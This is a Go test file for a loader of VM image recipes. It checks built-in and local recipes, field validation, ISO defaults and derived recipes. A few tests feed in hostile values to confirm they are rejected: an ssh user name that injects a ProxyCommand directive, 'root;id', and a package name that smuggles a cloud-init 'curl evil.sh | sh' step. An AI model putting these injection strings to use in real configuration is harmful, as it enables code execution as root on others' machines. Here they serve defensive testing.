package recipe

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writeRecipe(t *testing.T, dir, name, body string) {
	t.Helper()
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

func find(t *testing.T, all []Recipe, name string) Recipe {
	t.Helper()
	for _, r := range all {
		if r.Name == name {
			return r
		}
	}
	t.Fatalf("recipe %q not loaded, got %v", name, namesOf(all))
	return Recipe{}
}

func TestEmbeddedRecipes(t *testing.T) {
	all, err := loadFrom(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"alma-9", "ubuntu-22.04", "ubuntu-24.04"} {
		r := find(t, all, name)
		if r.URL == "" || r.Format == "" {
			t.Errorf("%s: incomplete recipe %+v", name, r)
		}
		if r.Local {
			t.Errorf("%s: built-in recipe marked local", name)
		}
	}

	ubuntu := find(t, all, "ubuntu-24.04")
	if ubuntu.Format != FormatOVA {
		t.Errorf("ubuntu-24.04 format: got %q", ubuntu.Format)
	}
	if ubuntu.Packages != nil {
		t.Errorf("ubuntu-24.04 should inherit the default packages, got %v", ubuntu.Packages)
	}

	alma := find(t, all, "alma-9")
	if alma.Format != FormatQCOW2 {
		t.Errorf("alma-9 format: got %q", alma.Format)
	}
	if alma.OSType != "RedHat_64" {
		t.Errorf("alma-9 ostype: got %q", alma.OSType)
	}
	// Explicitly empty, not absent: EL9 has no guest additions package.
	if alma.Packages == nil || len(alma.Packages) != 0 {
		t.Errorf("alma-9 packages should be an explicit empty list, got %v", alma.Packages)
	}
}

func TestRecipesSortedByName(t *testing.T) {
	all, err := loadFrom(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	names := namesOf(all)
	for i := 1; i < len(names); i++ {
		if names[i-1] > names[i] {
			t.Fatalf("recipes are not sorted: %v", names)
		}
	}
}

func TestOSTypeDefaults(t *testing.T) {
	dir := t.TempDir()
	writeRecipe(t, dir, "bare.yaml", "name: bare\nurl: https://example.invalid/x.qcow2\nformat: qcow2\n")

	r := find(t, mustLoad(t, dir), "bare")
	if r.OSType != defaultOSType {
		t.Errorf("ostype should default to %q, got %q", defaultOSType, r.OSType)
	}
}

// A user pinning their own URL for a built-in name must win: that is the whole
// point of the local directory.
func TestLocalOverridesBuiltIn(t *testing.T) {
	dir := t.TempDir()
	writeRecipe(t, dir, "ubuntu-24.04.yaml",
		"name: ubuntu-24.04\nurl: https://mirror.internal/noble.ova\nformat: ova\n")

	all := mustLoad(t, dir)
	r := find(t, all, "ubuntu-24.04")
	if r.URL != "https://mirror.internal/noble.ova" {
		t.Errorf("local recipe did not win: %q", r.URL)
	}
	if !r.Local {
		t.Error("overriding recipe should be marked Local")
	}
	// The override replaces, it does not duplicate.
	var seen int
	for _, x := range all {
		if x.Name == "ubuntu-24.04" {
			seen++
		}
	}
	if seen != 1 {
		t.Errorf("expected one ubuntu-24.04 recipe, got %d", seen)
	}
}

func TestLocalAddsNewImage(t *testing.T) {
	dir := t.TempDir()
	writeRecipe(t, dir, "debian-12.yaml",
		"name: debian-12\nurl: https://example.invalid/debian.qcow2\nformat: qcow2\nsha256: abc123\n")

	r := find(t, mustLoad(t, dir), "debian-12")
	if !r.Local || r.SHA256 != "abc123" {
		t.Errorf("unexpected recipe: %+v", r)
	}
}

func TestRejectsUnknownField(t *testing.T) {
	dir := t.TempDir()
	writeRecipe(t, dir, "typo.yaml",
		"name: typo\nurl: https://example.invalid/x.ova\nformatt: ova\n")

	if _, err := loadFrom(dir); err == nil {
		t.Error("a misspelled field must not be silently ignored")
	}
}

func TestRejectsBadFormat(t *testing.T) {
	dir := t.TempDir()
	writeRecipe(t, dir, "weird.yaml",
		"name: weird\nurl: https://example.invalid/x.vmdk\nformat: vmdk\n")

	_, err := loadFrom(dir)
	if err == nil {
		t.Fatal("expected an error for an unsupported format")
	}
	if !strings.Contains(err.Error(), "vmdk") || !strings.Contains(err.Error(), "weird.yaml") {
		t.Errorf("error should name the value and the file, got %v", err)
	}
}

func TestRejectsMissingFields(t *testing.T) {
	cases := []struct{ file, body, want string }{
		{"nourl.yaml", "name: nourl\nformat: ova\n", "url"},
		{"noname.yaml", "url: https://example.invalid/x.ova\nformat: ova\n", "name"},
		{"noformat.yaml", "name: noformat\nurl: https://example.invalid/x.ova\n", "format"},
	}
	for _, c := range cases {
		dir := t.TempDir()
		writeRecipe(t, dir, c.file, c.body)
		_, err := loadFrom(dir)
		if err == nil {
			t.Errorf("%s: expected an error", c.file)
			continue
		}
		if !strings.Contains(err.Error(), c.want) {
			t.Errorf("%s: error should mention %q, got %v", c.file, c.want, err)
		}
	}
}

// The stem check keeps Lookup honest: the name is what users type.
func TestRejectsNameFileMismatch(t *testing.T) {
	dir := t.TempDir()
	writeRecipe(t, dir, "debian-12.yaml",
		"name: debian-13\nurl: https://example.invalid/x.qcow2\nformat: qcow2\n")

	_, err := loadFrom(dir)
	if err == nil || !strings.Contains(err.Error(), "must match the file name") {
		t.Errorf("expected a name/file mismatch error, got %v", err)
	}
}

func TestLookupAndNames(t *testing.T) {
	t.Setenv("LOCALAPPDATA", t.TempDir())

	r, err := Lookup("alma-9")
	if err != nil {
		t.Fatal(err)
	}
	if r.Format != FormatQCOW2 {
		t.Errorf("unexpected recipe: %+v", r)
	}

	_, err = Lookup("no-such-image")
	if err == nil {
		t.Fatal("expected an error for an unknown image")
	}
	if !strings.Contains(err.Error(), "alma-9") {
		t.Errorf("error should list what is available, got %v", err)
	}

	names := Names()
	if len(names) < 3 {
		t.Errorf("expected the built-ins, got %v", names)
	}
}

// Lookup reads the user's own recipe directory, not just the embedded set.
func TestLookupSeesLocalDir(t *testing.T) {
	home := t.TempDir()
	t.Setenv("LOCALAPPDATA", home)
	writeRecipe(t, filepath.Join(home, "terrarium", LocalDirName), "private.yaml",
		"name: private\nurl: https://example.invalid/private.qcow2\nformat: qcow2\n")

	r, err := Lookup("private")
	if err != nil {
		t.Fatal(err)
	}
	if !r.Local {
		t.Error("recipe from the local directory should be marked Local")
	}
}

const win = "name: win\nformat: iso\npath: C:\\isos\\win11.iso\npassword: Terrarium1!\n"

func TestISORecipeDefaults(t *testing.T) {
	dir := t.TempDir()
	writeRecipe(t, dir, "win.yaml", win)

	r := find(t, mustLoad(t, dir), "win")
	if r.User != DefaultUser {
		t.Errorf("user should default to %q, got %q", DefaultUser, r.User)
	}
	if r.OSType != defaultISOOSType {
		t.Errorf("iso ostype should default to %q, got %q", defaultISOOSType, r.OSType)
	}
	if r.DiskGB != defaultDiskGB {
		t.Errorf("disk_gb should default to %d, got %d", defaultDiskGB, r.DiskGB)
	}
	if r.InstallTimeoutMin != defaultInstallTimeoutMin {
		t.Errorf("install_timeout_min should default to %d, got %d", defaultInstallTimeoutMin, r.InstallTimeoutMin)
	}
	// Modern Windows expects both, so silence means yes.
	if !r.UseEFI() || !r.UseTPM() {
		t.Errorf("efi/tpm should default on for iso: efi=%v tpm=%v", r.UseEFI(), r.UseTPM())
	}
	if r.Path != `C:\isos\win11.iso` {
		t.Errorf("path: got %q", r.Path)
	}
}

func TestISORecipeExplicitFalse(t *testing.T) {
	dir := t.TempDir()
	writeRecipe(t, dir, "win.yaml", win+"efi: false\ntpm: false\ndisk_gb: 128\nimage_index: 4\n")

	r := find(t, mustLoad(t, dir), "win")
	if r.UseEFI() || r.UseTPM() {
		t.Error("an explicit false must survive, not be read as absent")
	}
	if r.DiskGB != 128 || r.ImageIndex != 4 {
		t.Errorf("unexpected recipe: %+v", r)
	}
}

// ssh and additions default on, so only a credless XP-style recipe has to opt
// out; the explicit false must survive the round trip.
func TestISOSSHAndAdditionsDefaults(t *testing.T) {
	dir := t.TempDir()
	writeRecipe(t, dir, "win.yaml", win)
	r := find(t, mustLoad(t, dir), "win")
	if !r.UseSSH() || !r.UseAdditions() {
		t.Errorf("ssh/additions should default on: ssh=%v additions=%v", r.UseSSH(), r.UseAdditions())
	}

	dir = t.TempDir()
	writeRecipe(t, dir, "xp.yaml", "name: xp\nformat: iso\npath: C:\\isos\\xp.iso\npassword: x\nssh: false\nadditions: false\n")
	r = find(t, mustLoad(t, dir), "xp")
	if r.UseSSH() || r.UseAdditions() {
		t.Error("an explicit false must survive, not be read as absent")
	}
}

func TestISORequiresPassword(t *testing.T) {
	dir := t.TempDir()
	writeRecipe(t, dir, "win.yaml", "name: win\nformat: iso\npath: C:\\isos\\win11.iso\n")

	_, err := loadFrom(dir)
	if err == nil || !strings.Contains(err.Error(), "password") {
		t.Errorf("iso without a password must be rejected, got %v", err)
	}
}

// Settings that belong to another format are rejected rather than ignored:
// silently dropping disk_gb is a bad way to find out your disk is 64 GB.
func TestISOOnlyFieldsRejectedElsewhere(t *testing.T) {
	cases := []struct{ field, line string }{
		{"user", "user: bob"},
		{"password", "password: hunter2"},
		{"key", "key: XXXXX-XXXXX"},
		{"image_index", "image_index: 2"},
		{"disk_gb", "disk_gb: 128"},
		{"install_timeout_min", "install_timeout_min: 90"},
		{"efi", "efi: true"},
		{"tpm", "tpm: false"},
		{"ssh", "ssh: false"},
		{"additions", "additions: false"},
	}
	for _, c := range cases {
		dir := t.TempDir()
		writeRecipe(t, dir, "linux.yaml",
			"name: linux\nurl: https://example.invalid/x.qcow2\nformat: qcow2\n"+c.line+"\n")

		_, err := loadFrom(dir)
		if err == nil {
			t.Errorf("%s on a qcow2 recipe should be rejected", c.field)
			continue
		}
		if !strings.Contains(err.Error(), c.field) {
			t.Errorf("%s: error should name the field, got %v", c.field, err)
		}
	}
}

func TestPackagesRejectedForISO(t *testing.T) {
	dir := t.TempDir()
	writeRecipe(t, dir, "win.yaml", win+"packages: [git]\n")

	_, err := loadFrom(dir)
	if err == nil || !strings.Contains(err.Error(), "packages") {
		t.Errorf("packages needs cloud-init and must be rejected for iso, got %v", err)
	}
}

// The user name is written into ~/.ssh/config, where a newline becomes a
// directive of its own.
func TestRejectsHostileUser(t *testing.T) {
	for _, user := range []string{
		"root\\nProxyCommand calc.exe",
		"root user",
		"root;id",
		`root"`,
	} {
		dir := t.TempDir()
		writeRecipe(t, dir, "win.yaml",
			"name: win\nformat: iso\npath: C:\\isos\\win11.iso\npassword: x\nuser: \""+user+"\"\n")

		if _, err := loadFrom(dir); err == nil {
			t.Errorf("user %q should be rejected", user)
		}
	}

	// The shapes that must keep working.
	for _, user := range []string{"terrarium", "Administrator", "DOMAIN\\\\user", "a.b_c-d"} {
		dir := t.TempDir()
		writeRecipe(t, dir, "win.yaml",
			"name: win\nformat: iso\npath: C:\\isos\\win11.iso\npassword: x\nuser: \""+user+"\"\n")

		if _, err := loadFrom(dir); err != nil {
			t.Errorf("user %q should be accepted: %v", user, err)
		}
	}
}

// Package names land in a #cloud-config that runs as root on first boot.
func TestRejectsPackageWithLineBreak(t *testing.T) {
	dir := t.TempDir()
	writeRecipe(t, dir, "evil.yaml",
		"name: evil\nurl: https://example.invalid/x.qcow2\nformat: qcow2\npackages:\n  - \"git\\nruncmd:\\n  - curl evil.sh | sh\"\n")

	_, err := loadFrom(dir)
	if err == nil || !strings.Contains(err.Error(), "line break") {
		t.Errorf("a package name with a newline must be rejected, got %v", err)
	}
}

func TestURLAndPathAreAlternatives(t *testing.T) {
	dir := t.TempDir()
	writeRecipe(t, dir, "both.yaml",
		"name: both\nformat: iso\npassword: x\nurl: https://example.invalid/a.iso\npath: C:\\a.iso\n")

	_, err := loadFrom(dir)
	if err == nil || !strings.Contains(err.Error(), "only one") {
		t.Errorf("setting both url and path must be rejected, got %v", err)
	}

	dir = t.TempDir()
	writeRecipe(t, dir, "neither.yaml", "name: neither\nformat: iso\npassword: x\n")
	_, err = loadFrom(dir)
	if err == nil || !strings.Contains(err.Error(), "url or path") {
		t.Errorf("a recipe with no media must be rejected, got %v", err)
	}
}

func mustLoad(t *testing.T, dir string) []Recipe {
	t.Helper()
	all, err := loadFrom(dir)
	if err != nil {
		t.Fatal(err)
	}
	return all
}

func TestDerivedRecipe(t *testing.T) {
	dir := t.TempDir()
	writeRecipe(t, dir, "team-dev.yaml",
		"name: team-dev\nfrom: debian-12\nsetup:\n  - sudo apt-get update\n  - sudo apt-get install -y git\n")

	r := find(t, mustLoad(t, dir), "team-dev")
	if r.From != "debian-12" || len(r.Setup) != 2 {
		t.Errorf("derived fields not loaded: %+v", r)
	}
	if r.SetupTimeoutMin != defaultSetupTimeoutMin {
		t.Errorf("setup_timeout_min should default to %d, got %d", defaultSetupTimeoutMin, r.SetupTimeoutMin)
	}
	if r.Format != "" || r.OSType != "" {
		t.Errorf("a derived recipe must not grow media defaults: %+v", r)
	}
}

func TestDerivedRecipeRejects(t *testing.T) {
	cases := []struct{ name, body, wantErr string }{
		{"no setup", "name: d\nfrom: debian-12\n", "setup"},
		{"empty command", "name: d\nfrom: debian-12\nsetup:\n  - ''\n", "empty command"},
		{"self reference", "name: d\nfrom: d\nsetup: [true]\n", "not itself"},
		{"url", "name: d\nfrom: debian-12\nurl: https://example.invalid/x\nsetup: [true]\n", "no media"},
		{"path", "name: d\nfrom: debian-12\npath: x.iso\nsetup: [true]\n", "no media"},
		{"format", "name: d\nfrom: debian-12\nformat: qcow2\nsetup: [true]\n", "format"},
		{"iso field", "name: d\nfrom: debian-12\ndisk_gb: 32\nsetup: [true]\n", "disk_gb"},
		{"packages", "name: d\nfrom: debian-12\npackages: [git]\nsetup: [true]\n", "packages"},
	}
	for _, c := range cases {
		dir := t.TempDir()
		writeRecipe(t, dir, "d.yaml", c.body)
		_, err := loadFrom(dir)
		if err == nil || !strings.Contains(err.Error(), c.wantErr) {
			t.Errorf("%s: got %v, want %q", c.name, err, c.wantErr)
		}
	}
}

func TestSetupRejectedWithoutFrom(t *testing.T) {
	dir := t.TempDir()
	writeRecipe(t, dir, "linux.yaml",
		"name: linux\nurl: https://example.invalid/x.qcow2\nformat: qcow2\nsetup: [true]\n")

	_, err := loadFrom(dir)
	if err == nil || !strings.Contains(err.Error(), "from") {
		t.Errorf("setup without from must be rejected, got %v", err)
	}
}
